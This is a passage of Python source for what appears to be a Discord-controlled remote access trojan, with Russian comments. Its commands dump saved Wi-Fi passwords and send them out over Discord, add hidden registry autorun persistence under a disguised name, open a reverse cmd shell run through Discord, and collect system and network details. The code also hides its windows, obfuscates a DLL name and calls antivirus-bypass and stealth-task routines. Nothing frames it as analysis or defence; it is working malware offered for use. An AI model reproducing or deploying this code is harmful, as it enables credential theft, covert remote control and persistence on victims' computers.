        result = subprocess.run(
            ["netsh", "wlan", "show", "profiles"],
            capture_output=True, text=True, encoding="cp866", errors="replace",
            creationflags=0x08000000
        )
        profiles = [
            line.split(":")[1].strip()
            for line in result.stdout.splitlines()
            if ":" in line and ("All User Profile" in line or "Профиль всех пользователей" in line or "Профиль" in line)
        ]
        lines = []
        for profile in profiles:
            try:
                r = subprocess.run(
                    ["netsh", "wlan", "show", "profile", profile, "key=clear"],
                    capture_output=True, text=True, encoding="cp866", errors="replace",
                    creationflags=0x08000000
                )
                passwd = ""
                for l in r.stdout.splitlines():
                    if "Key Content" in l or "Содержимое ключа" in l:
                        passwd = l.split(":", 1)[-1].strip()
                        break
                lines.append(f"SSID: {profile:<30} PASS: {passwd or '(нет)'}")
            except Exception:
                lines.append(f"SSID: {profile:<30} PASS: (ошибка)")
        await safe_send(ctx, "\n".join(lines) if lines else "Сетей не найдено.", filename="wifi.txt")
    except Exception as e:
        await ctx.send(f"Ошибка: {e}")

# ─── PERSIST ЧЕРЕЗ РЕЕСТР (HKCU RUN) ──────────────────────────────────────────
@bot.command()
async def persist_reg(ctx):
    """Добавить запись в HKCU\\Run для автозапуска"""
    try:
        exe = sys.executable
        script = os.path.abspath(__file__) if "__file__" in dir() else os.path.join(tempfile.gettempdir(), "sys_service.py")
        value = f'\"{exe}\" -W ignore \"{script}"\'
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                           r"Software\Microsoft\Windows\CurrentVersion\Run",
                           0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, "WindowsHostHelper", 0, winreg.REG_SZ, value)
        winreg.CloseKey(k)
        await ctx.send("Добавлен в HKCU\\Run как `WindowsHostHelper`.")
    except Exception as e:
        await ctx.send(f"Ошибка: {e}")

@bot.command()
async def persist_remove(ctx):
    """Убрать запись из HKCU\\Run"""
    try:
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                           r"Software\Microsoft\Windows\CurrentVersion\Run",
                           0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(k, "WindowsHostHelper")
        winreg.CloseKey(k)
        await ctx.send("Удалено из HKCU\\Run.")
    except Exception as e:
        await ctx.send(f"Ошибка: {e}")

# ─── REVERSE SHELL (интерактивный cmd через Discord) ──────────────────────────
_shell_proc = None

@bot.command()
async def shell_start(ctx):
    """Запустить интерактивный reverse shell (cmd через Discord)"""
    global _shell_proc
    if _shell_proc and _shell_proc.poll() is None:
        await ctx.send("Shell уже запущен. `!sh <команда>` для ввода.")
        return
    _shell_proc = subprocess.Popen(
        ["cmd.exe"],
        stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
        creationflags=0x08000000, text=True, encoding="cp866", errors="replace"
    )
    await ctx.send("Shell запущен. `!sh <команда>` — ввод, `!shell_stop` — выход.")

@bot.command()
async def sh(ctx, *, command: str):
    """Выполнить команду в интерактивном shell"""
    global _shell_proc
    if not _shell_proc or _shell_proc.poll() is not None:
        await ctx.send("Shell не запущен. `!shell_start`")
        return
    import select, msvcrt
    _shell_proc.stdin.write(command + "\n")
    _shell_proc.stdin.flush()
    await asyncio.sleep(0.8)
    output = []
    while True:
        try:
            if msvcrt.kbhit():
                break
            line = _shell_proc.stdout.readline()
            if not line:
                break
            output.append(line)
            if len(output) > 50:
                break
        except Exception:
            break
    text = "".join(output).strip() or "(нет вывода)"
    await safe_send(ctx, f"```\n{text}\n```", filename="shell_out.txt")

@bot.command()
async def shell_stop(ctx):
    """Убить reverse shell"""
    global _shell_proc
    if _shell_proc:
        _shell_proc.kill()
        _shell_proc = None
    await ctx.send("Shell остановлен.")

# ─── SYSINFO ───────────────────────────────────────────────────────────────────
@bot.command()
async def sysinfo(ctx):
    """Полная информация о системе"""
    try:
        cpu = subprocess.run(["wmic","cpu","get","Name","/value"],
            capture_output=True, text=True, encoding="cp866", errors="replace",
            creationflags=0x08000000).stdout.strip()
        ram_gb = round(psutil.virtual_memory().total / (1024**3), 1)
        disk = psutil.disk_usage("/")
        ip_info = subprocess.run(["ipconfig"],
            capture_output=True, text=True, encoding="cp866", errors="replace",
            creationflags=0x08000000).stdout
        lines = [
            f"**Хост:** `{os.environ.get('COMPUTERNAME','?')}\\{os.environ.get('USERNAME','?')} `",
            f"**ОС:** `{subprocess.run(['wmic','os','get','Caption','/value'], capture_output=True, text=True, encoding='cp866', errors='replace', creationflags=0x08000000).stdout.strip()}`",
            f"**CPU:** `{cpu}`",
            f"**RAM:** `{ram_gb} ГБ`",
            f"**Диск C:** `{round(disk.used/1024**3,1)} / {round(disk.total/1024**3,1)} ГБ`",
            f"**Аптайм:** `{int(ctypes.WinDLL(bytes(x^0xAA for x in [193,207,216,196,207,198,153,152]).decode()).GetTickCount64()//1000)} с`",
            f"**IP:**",
            f"```\n{ip_info[:800]}\n```",
        ]
        await ctx.send("\n".join(lines))
    except Exception as e:
        await ctx.send(f"Ошибка: {e}")

if __name__ == "__main__":
    if check_environment():
        bypass_av_memory()
        install_stealth_task()
        bot.run(BOT_TOKEN)
